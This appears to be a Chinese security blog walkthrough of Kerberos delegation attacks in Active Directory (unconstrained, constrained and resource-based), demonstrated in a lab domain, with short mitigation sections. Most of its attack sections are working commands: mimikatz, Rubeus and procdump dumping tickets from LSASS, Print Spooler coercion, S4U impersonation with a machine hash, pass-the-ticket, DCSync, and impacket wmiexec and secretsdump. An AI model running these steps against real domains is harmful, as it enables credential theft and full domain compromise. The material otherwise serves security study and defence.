---
title: 域渗透中的 Kerberos 委派攻击
tags:
  - AD Pentest
  - Kerberos
  - Delegation
date: 2021-01-18 14:10:19
---

**域委派** 是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动。委派主要分为 **非约束委派(Unconstrained delegation)** 和 **约束委派(Constrained delegation)**。

## 0x01 非约束委派


### Unconstrained Delegation

**在托管 TGS-REQ 中引用的服务主体名称（SPN) 中指定的服务的服务器上启用 Kerberos 非约束委派时，DC 将用户的 TGT 副本放入服务票据中。当用户的服务票据（TGS 票据）提供给服务器来访问服务时，服务器将打开 TGS 票据，将用户的 TGT 放入本地安全认证子系统服务 LSASS，以供以后使用，此时应用服务器可以无限制地模拟用户身份。**

![](/assets/images/move/2021-01-18-15-02-21.png)

**1a.** 用户密码转换为 NTLM 哈希，时间戳使用哈希进行加密，并作为身份验证票据&票据授予票据（TGT）请求（AS-REQ）中的身份验证器发送给 KDC。

**1b.** 域控制器（KDC）检查用户信息（登录限制，组成员身份等）并创建票据授予票据（TGT）。

**2\.** 票据授予票据 TGT 加密、签名，并交付给用户（AS-REP）。只有域中的 Kerberos 服务（KRBTGT）才能打开和读取 TGT 数据。

**3\.** 用户向 DC 发送 TGT，请求票据授予服务（TGS）票据（TGS-REQ）。DC 打开 TGT 并验证 PAC 校验和，如果 DC 可以打开票及校验且 PAC 校验通过，TGT 有效，复制 TGT 中的数据以创建 TGS 票据。

**4\.** TGS 票据通过目标服务账户的 NTLM Hash 加密后发送给用户(TGS-REP).

**5\.** 用户连接到在适当端口上托管服务的服务器 & 发送 TGS (AP-REQ)，服务通过自己的 NTLM Hash 打开票据。

### Credential Theft

实验环境：

- Domain：ins.z

- Domain Controller: Windows Server 2012 R2, netbios `2012dc`, 192.168.1.12

- Domain Computer: Windows Server 2008 R2, netbios `IIS-8`, 192.168.1.8 

1\. DC 为 IIS-8 主机用户设置非约束委派：

Active Directory 用户和计算机 -> Computers -> IIS-8 -> 属性 & 委派:

- 委派是一个安全敏感的操作，它允许服务代表另一个用户运行。

- ☑ 信任此计算机来委派任何服务（仅 Kerberos）(T)

2\. IIS-8 开启 WinRM 服务：

```powershell
winrm quickconfig -q / Enable-PSRemoting -Force
winrm e winrm/config/listener
```

3\. DC 以 `administrator` 的身份通过 WinRM 服务远程连接 IIS-8:

```powershell
Enter-PSSession -ComputerName iis-8
```

![](/assets/images/move/2021-01-18-18-52-56.png)

4\. 此时域管理员的 TGT 已经缓存在 IIS-8 LSASS，通过 mimikatz/Rubeus 可导出：

```powershell
# mimikatz
privilege::debug 
sekurlsa::tickets /export
# rubeus
rubeus.exe triage
rubeus.exe dump # [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("aa..."))
```

![](/assets/images/move/2021-01-20-11-41-02.png)

测试当前无权限访问 DC 的 cifs 服务：

![](/assets/images/move/2021-01-20-11-43-27.png)

```powershell
mimikatz.exe "kerberos::ptt file.kirbi" "exit"
rubeus.exe ptt /ticket:file.kirbi
```

导入 DC administrator tgt 票据后可成功访问：

![](/assets/images/move/2021-01-20-15-04-11.png)


Procdump + mimikatz:

```powershell
procdump64.exe -accepteula -ma lsass.exe
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::tickets /export" "exit"
```

### & DC Print Bug

`PrintBug`: Windows 打印系统远程协议（`MS-RPRN`）中的一种旧的但是默认启用的方法 `RpcRemoteFindFirstPrinterChangeNotification（Ex）`强制任何运行了 `Spooler` 服务的计算机以通过`Kerberos` 或 `NTLM` 对攻击者选择的目标进行身份验证。任何经过身份验证的域用户都可以远程连接到 DC 的打印服务器（后台打印程序服务, Spooler Service）并请求更新新的打印作业，DC 将立即测试该连接，从而暴露 DC 计算机帐户的凭据（因为后台打印程序为 SYSTEM 拥有）。

![](/assets/images/move/2021-01-20-16-26-11.png)

攻击者向 DC(运行后台打印程序服务,Print Spooler Service) 发送 RpcRemoteFindFirstPrinterChangeNotification 请求，DC 收到后立即向攻击者所控制的一台 **主机账户开启了非约束委派** 的域内机器发起身份认证，攻击者可在非约束委派机器的 LSASS 进程中获取到 DC 主机账户的 TGT 票据。

[SpoolSamplerNET](https://github.com/leftp/SpoolSamplerNET) 请求 DC Spooler Service：

```powershell
SpoolSamplerNET.exe win10.ins.z 2012dc.ins.z
```

![](/assets/images/move/2021-01-20-17-17-53.png)

非约束委派机器上 Rubeus 成功捕获到 DC 机器用户 2012dc$ 的 tgt 票据：

```powershell
.\Rubeus.exe monitor /interval:1 /filteruser:2012dc$
```

![](/assets/images/move/2021-01-20-17-18-37.png)

转换 Base64 TGT 为 kirbi 票据文件，并通过 Rubeus 导入：

```powershell
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("aa..."))
.\Rubeus.exe ptt /ticket:ticket.kirbi
```

进而可以 mimikatz / [DCSyncer](https://github.com/notsoshant/DCSyncer) 来 DCSync：

```
mimikatz "lsadump::dcsync /domain:ins.z /all /csv" "exit"
DCSyncer-x64.exe
```

### Mitigation

1. 不使用非约束委派，使用约束委派配置需要委派的服务器。

2. 将所有提升的管理员帐户配置为”帐户敏感，无法委派“。

3. [Protected Users Group](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn466518(v=ws.11)?redirectedfrom=MSDN), Windows Server 2012 R2 域功能级别开始提供的可用版本也缓解了此问题，因为此组中的帐户不允许委派。

> 当受保护的用户的组帐户升级到 Windows Server 2012 R2 域功能级别时，基于域控制器的保护会自动应用。通过 Windows Server 2012 R2 域进行身份验证的受保护用户组的成员不再可以使用以下方法进行身份验证：
> - 默认凭证委派(Default credential delegation, CredSSP), 即使启用了“允许委派默认凭据组策略”设置，也不会缓存纯文本凭据。
> - Windows Digest, 即使启用 Windows Digest，也不会缓存纯文本凭据。
> - NTLM, NT 单向函数的结果 NTOWF 未缓存。
> - Kerberos 长期密钥, 来自 Kerberos 初始 TGT 请求的密钥通常会被缓存，因此身份验证请求不会中断。对于该组中的帐户，Kerberos 协议会在每个请求时验证身份验证。
> - 离线登陆，登录时未创建缓存的验证程序。


## 0x02 约束委派

### Constrained Delegation

由于非约束委派的不安全性（配置了非约束委派的机器在 LSASS 中缓存了用户的 TGT 票据可模拟用户去访问域中任意服务），微软在 Windows Server 2003 中引入了约束委派，对 Kerberos 协议进行拓展，引入了 `S4U`(S4U2Self / S4U2proxy), 运行服务代表用户向 KDC 请求票据。

- `S4U2self`(Service for User to S4U2Self) 可以代表自身请求针对其自身的 Kerberos 服务票据(ST)；如果一个**服务账户**的 userAccountControl 标志为 `TRUSTED_TO_AUTH_FOR_DELEGATION`, 则其可以**代表任何其他用户**获取自身服务的 TGS/ST。 

- `S4U2proxy`(Service for User to Proxy) 可以以用户的名义请求其它服务的 ST，限制了 S4U2proxy 扩展的范围。服务帐户可以**代表任何用户**获取在 `msDS-AllowedToDelegateTo` 中设置的服务的 TGS/ST，首先需要从该用户到其本身的 TGS/ST，但它可以在请求另一个 TGS 之前使用 S4U2self 获得此 TGS/ST。

不同于允许委派所有服务的非约束委派，约束委派的目的是在模拟用户的同时，限制委派机器/帐户对特定服务的访问。

![](/assets/images/move/2021-01-20-18-29-35.png)

**S4U2self**：

(1) 用户向 service1 发送请求。用户已通过身份验证，但 service1 没有用户的授权数据。通常，这是由于身份验证是通过 Kerberos 以外的其他方式验证的。

(2) 通过 S4U2self 扩展以用户的名义向 KDC 请求用于访问 service1 的 ST1。

(3) KDC 返回给 service1 一个用于用户验证 service1 的 ST1，该 ST1 可能包含用户的授权数据。

(4) service1 可以使用 ST 中的授权数据来满足用户的请求，然后响应用户。

尽管 S4U2self 向 service1 提供有关用户的信息，但 S4U2self 不允许 service1 代表用户发出其他服务的请求，这时候就轮到 S4U2proxy 发挥作用了。

**S4U2proxy**:

(5) 用户向 service1 发送请求，service1 需要以用户身份访问 service2 上的资源。

(6) service1 以用户的名义向 KDC 请求用户访问 service 2的 ST2。

(7) 如果请求中包含 PAC，则 KDC 通过检查 PAC 的签名数据来验证 PAC ，如果 PAC 有效或不存在，则 KDC 返回 ST2 给 service1，但存储在 ST2 的 cname 和 crealm 字段中的客户端身份是用户的身份，而不是 service1 的身份。

(8) service1 使用 ST2 以用户的名义向 service2 发送请求，并判定用户已由 KDC 进行身份验证。

(9) service2 响应步骤 8 的请求。

(10) service1 响应用户对步骤 5 中的请求。

### Attack

**如果我们可以攻破配置约束委派的服务账户(获取密码/Hash)，我们就可以模拟域内任意用户(如 domain\administrator) 并代表其获得对已配置服务的访问权限（获取 TGS 票据）。**

此外，我们不仅可以访问约束委派配置中用户可以模拟的服务，**还可以访问使用与模拟帐户权限允许的任何服务。**（因为未检查 SPN，只检查权限）。比如，如果我们能够访问 CIFS 服务，那么同样有权限访问 HOST 服务。注意如果我们有权限访问到 DC 的 LDAP 服务，则有足够的权限去执行 DCSync。

> 如果 AD 中将用户标记为“帐户敏感且无法委派”，则无法模拟其身份。

实验环境：

- Domain: ins.z

- Domain Controller

  - Windows Server 2012 R2, 2012dc.ins.z, 192.168.1.12

- Domain Computer

  - Windows Server 2008 R2, iis-8.ins.z, 192.168.1.8
  - Windows 10 Pro, win10.ins.z, 192.168.1.10
  - Windows 7 Pro, win7.ins.z, 192.168.1.7

在 DC 上为 IIS-8 机器账号设置约束委派，仅信任此计算机来委派指定的服务，可由此账户提供委派凭据的服务为 `cifs\win7.ins.z`.

当我们掌握了 `IIS-8$` 的 NTLM Hash 后，可通过 kekeo/Rubeus 进行认证服务器交换获取票据授予票据 TGT。

```powershell
Rubeus.exe asktgt /user:IIS-8$ /rc4:bd3d734cdaec88d806c2f8458eb6c357 /outfile:tgt_iis-8.kirbi
# [+] Ticket successfully imported!
kekeo.exe "tgt::ask /user:IIS-8$ /domain:ins.z /ntlm:bd3d734cdaec88d806c2f8458eb6c357" "exit"
# Ticket in file 'TGT_IIS-8$@INS.Z_krbtgt~ins.z@INS.Z.kirbi'
```

进而通过约束委派机器账户 IIS-8$ 的 TGT 来伪造 S4U 请求，以 ins\administrator 的用户身份请求访问 cifs/win7.ins.z:

```powershell
kekeo.exe tgs::s4u /tgt:TGT_IIS-8$@INS.Z_krbtgt~ins.z@INS.Z.kirbi /user:administrator@ins.z /service:cifs/win7.ins.z
# > Ticket in file 'TGS_administrator@ins.z@INS.Z_IIS-8$@INS.Z.kirbi' -> S4U2self
# > Ticket in file 'TGS_administrator@ins.z@INS.Z_cifs~win7.ins.z@INS.Z.kirbi' -> S4U2proxy
```

最后通过 mimikatz/Rubeus 导入用于访问 cifs/win7.ins.z 的 TGS 即可：

```powershell
mimikatz.exe kerberos::ptt TGS_administrator@ins.z@INS.Z_cifs~win7.ins.z@INS.Z.kirbi
Rubeus.exe ptt /ticket:TGS_administrator@ins.z@INS.Z_cifs~win7.ins.z@INS.Z.kirbi
```

访问 cifs/win7.ins.z 进行验证：

```
C:\Users\002\Desktop>dir \\win7.ins.z\c$
 驱动器 \\win7.ins.z\c$ 中的卷没有标签。
 卷的序列号是 54BC-FE1C

 \\win7.ins.z\c$ 的目录

2009/07/14  11:20    <DIR>          PerfLogs
2011/04/12  22:57    <DIR>          Program Files
2009/07/14  12:57    <DIR>          Program Files (x86)
2021/01/21  15:16    <DIR>          Users
2021/01/18  17:38    <DIR>          Windows
               0 个文件              0 字节
               5 个目录 52,403,658,752 可用字节
```

委派过程分析：

![](/assets/images/move/2021-01-21-15-51-26.png)

1\. `AS 认证服务器交换` IIS-8$ 向 KDC 申请票据授予票据 TGT：

![](/assets/images/move/2021-01-21-15-56-02.png)

2\. `S4U2self` 通过步骤 1 获取的票据授予票据 TGT 来发送 S4U2self 请求，以 `ins\administrator` 身份向 TGS 票据许可服务器申请访问自身的服务票据授予服务 TGS 票据。

![](/assets/images/move/2021-01-21-17-23-05.png)

3\. `S4U2proxy` 附带上步骤 2 获取的 TGS 票据向 DC 发起 S4U2proxy 请求，以 `ins\administrator` 身份向 TGS 票据许可服务器申请访问 Win7 cifs 服务票据。

![](/assets/images/move/2021-01-21-17-30-11.png)

kekeo:

```powershell
tgt::ask /user:IIS-8$ /domain:ins.z /ntlm:bd3d734cdaec88d806c2f8458eb6c357
kerberos::ptt TGT_IIS-8$@INS.Z_krbtgt~ins.z@INS.Z.kirbi
tgs::s4u /tgt:TGT_IIS-8$@INS.Z_krbtgt~ins.z@INS.Z.kirbi /user:administrator@ins.z /service:cifs/win7.ins.z
kerberos::ptt TGS_administrator@ins.z@INS.Z_cifs~win7.ins.z@INS.Z.kirbi
```

rubeus:

```powershell
# rubeus
# Obtain a TGT for the Constained allowed user
Rubeus.exe asktgt /user:iis-8$ /rc4:bd3d734cdaec88d806c2f8458eb6c357 /outfile:TGT_iis-8.kirbi
# Obtain a TGS of the Administrator user to self
Rubeus.exe s4u /ticket:TGT_iis-8.kirbi /impersonateuser:Administrator /outfile:TGS_administrator.kirbi
# Obtain service TGS impersonating Administrator (CIFS)
Rubeus.exe s4u /ticket:TGT_iis-8.kirbi /tgs:TGS_administrator_Administrator@INS.Z_to_iis-8$@INS.Z.kirbi /msdsspn:"CIFS/win7.ins.z" /outfile:TGS_administrator_CIFS.kirbi
# Impersonate Administrator on different service (HOST)
Rubeus.exe s4u /ticket:TGT_iis-8.kirbi /tgs:TGS_administrator_Administrator@INS.Z_to_iis-8$@INS.Z.kirbi /msdsspn:"CIFS/win7.ins.z" /altservice:HOST /outfile:TGS_administrator_HOST.kirbi
# Load ticket in memory
Rubeus.exe ptt /ticket:TGS_administrator_HOST_HOST-win7.ins.z.kirbi
Rubeus.exe ptt /ticket:TGS_administrator_HOST_HTTP-win7.ins.z.kirbi
```

导入与约束委派允许的服务所在服务器相对应的 HOST 服务票据 + HTTP 服务票据，即可伪装为域管用户 administrator 通过 WinRM 管理远程主机。

![](/assets/images/move/2021-01-22-11-41-58.png)

```powershell
winrs -r:win7.ins.z "ipconfig"(/cmd)
```

![](/assets/images/move/2021-01-22-11-25-39.png)

![](/assets/images/move/2021-01-22-11-40-49.png)


> WinRM 代表 Windows 远程管理，是一种允许管理员远程执行系统管理任务的服务。通过 HTTP（5985）或 HTTPS SOAP（5986）执行通信，默认情况下支持 Kerberos 和 NTLM 身份验证以及基本身份验证。使用此服务需要管理员级别凭据。

约束委派账户伪造 adnimistrator 账户访问 dc krbtgt 服务，生成 ccache 文件注入内存，效果相当于“黄金票据”：

```powershell
# impacket getST https://github.com/ropnop/impacket_static_binaries
getST.exe -spn cifs/win7.ins.z -impersonate Administrator -hashes :bd3d734cdaec88d806c2f8458eb6c357 -dc-ip 192.168.1.12 ins.z/iis-8$
# mimikatz ptc pass the cache
mimikatz.exe "kerberos::ptc Administrator.ccache" "exit"
# impacket wmiexec
set KRB5CCNAME=Administrator.ccache
wmiexec.exe -no-pass -k administrator@2012dc.ins.z -dc-ip 192.168.1.12
# impacket secretdump
set KRB5CCNAME=Administrator.ccache
secretsdump.exe -no-pass -k 2012dc.ins.z
```

### Mitigation

1. 尽可能禁用 Kerberos 委派。
2. 限制 Domain Admin 登录范围。
3. 为特权帐户设置“帐户敏感，无法委托” / 加入 Protected Group。
4. 提高用户密码复杂度，抵抗 Kerberoasting 攻击。

## 0x03 基于资源的约束委派

### RBCD

微软在 Windows Server 2012 中新加入了基于 kerberos 资源的约束委派(rbcd)，与传统的约束委派相比，它不再需要域管理员对其进行配置，可以直接在机器账户上配置`msDS-AllowedToActOnBehalfOfOtherIdentity` 属性来设置基于资源的约束委派。此属性的作用是控制哪些用户可以模拟成域内任意用户，然后向该计算机进行身份验证。

基于资源的约束委派与约束委派相似，不同之处在于约束委派赋予 **服务(机器)账号/对象** 权限去 **模拟任意用户访问特定资源服务**，而基于资源的约束委派**对资源对象设置谁能代表(任意)用户来访问它**，资源对象本身可以为自己配置资源委派信任关系，决定信任对象。

![](/assets/images/move/2021-01-22-18-19-41.png)

在这种情况下，受约束的资源对象将具有一个名为 `msDS-AllowedToActOnBehalfOfOtherIdentity` 的属性，其值为可以模拟其他任何用户的服务账户名。

此外基于资源的约束委派与其他委派形式有个重要区别是，任何具有**计算机帐户写权限（GenericAll/GenericWrite/WriteDacl/WriteProperty/etc）的任何用户都可以设置** `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性，在其他形式的委派中，此类操作需要域管理员特权才能完成。

事实上，在约束委派 `S4U2Self` 过程中，服务账户（有 SPN）可以在 `userAccountControl` 中无 `TrustedToAuthForDelegation` 标识的情况下，代表任意其他用户获取自身服务的 TGS 票据，但只有在包含 `TrustedToAuthForDelegation` 位时，返回的 TGS 票据才是可转发的 `Forwardable`。

如果在 `S4U2Self` 中获取的 TGS 票据不包含 `Forwardable` 属性，在约束委派的 `S4U2proxy` 中将无法使用。**但是，如果将其用于基于资源的约束委派，它将起作用（显然这不是漏洞，而是功能）。**


### Attack

> 如果我们具有计算机帐户的等效写权限，则可以在该计算机上获得特权访问权限。

假设攻击者已经在受害计算机上拥有等同于计算机账户的写入权限：

1\. 攻击者攻破 **具有 SPN 的账户** 或创建一个 SPN 的帐户（Sercive A）。**没有任何其他特殊特权的任意管理员用户都可以最多创建 10 个计算机对象(`MachineAccountQuota`)，并为其设置服务主体名称 SPN。**

2\. 攻击者配置从 Service A 到受害主机 Service B 的基于资源的约束委派。

3\. 攻击者使用 Rubeus 执行完整的 `S4U` 攻击，从 Service A 到 Service B，在对 Service B 没有特殊访问权限的情况下。

- `S4U2Self`(SPN compromised/created account): 模仿 administrator 请求一张 TGS 服务票据 (Not `Forwardable`).

- `S4U2Proxy`：使用 `S4U2Self` 获取的 TGS 票据，请求从 administrator 到受害主机 Service B 的 TGS 票据。

4\. 攻击者可通过 PTT 模拟 administrator 获取受害主机 Service B 的访问权限。

**\*** `MachineAccountQuota` MAQ 是一个域级别的属性，默认情况下可以允许非特权用户(普通域用户)将主机连接到 AD 域，能连接的主机数最多不超过 10 台。该值表示允许域用户在域中创建的计算机帐户数，默认为 10，计算机账户默认注册 RestrictedKrbHost/domain 和 HOST/domain SPN。


```powershell
Get-DomainObject -Identity "dc=ins,dc=z" -Domain ins.z | select MachineAccountQuota
```

在 [这是一篇“不一样”的真实渗透测试案例分析文章](https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/) 中，作者根据 Discuz 数据库中提取的用户名和密码通过 Kerberute 进行用户名撞库及密码喷洒，成功获取到一个普通域用户账号来添加机器账户 `evilpc$` (含 SPN)，再通过 `webdev` 服务器 XXE 进行 NTTLMRelay 到域控 LDAP 配置基于资源的约束委派，允许 `evilpc$` 代表任意账户访问，最后通过 S4U 协议向申请高权限(administrator)票据，进而 PTT 完成对 `webdav` 服务器的控制。


   
**- Reference -**

\[1\] [域渗透——Kerberos委派攻击](https://xz.aliyun.com/t/7217)

\[2\] [Active Directory Security Risk #101: Kerberos Unconstrained Delegation](https://adsecurity.org/?p=1667)

\[3\] [SPNs - Active Directory Service Principal Names (SPNs) Descriptions](https://adsecurity.org/?page_id=183)

\[4\] [横向渗透之 [WinRM] & [WinRS]](http://t3ngyu.leanote.com/post/LM-WinRM-WinRS)

\[5\] [Constrained Delegation - HackTricks](https://book.hacktricks.xyz/windows/active-directory-methodology/constrained-delegation)

\[6\] [域渗透——基于资源的约束委派利用](https://xz.aliyun.com/t/7454)

\[7\] [Kerberos 协议之基于资源的约束委派](https://github.com/Y4er/Y4er.com/blob/master/content/post/Kerberos-Resource-based-Constrained-Delegation.md)

\[8\] [这是一篇“不一样”的真实渗透测试案例分析文章](https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/)










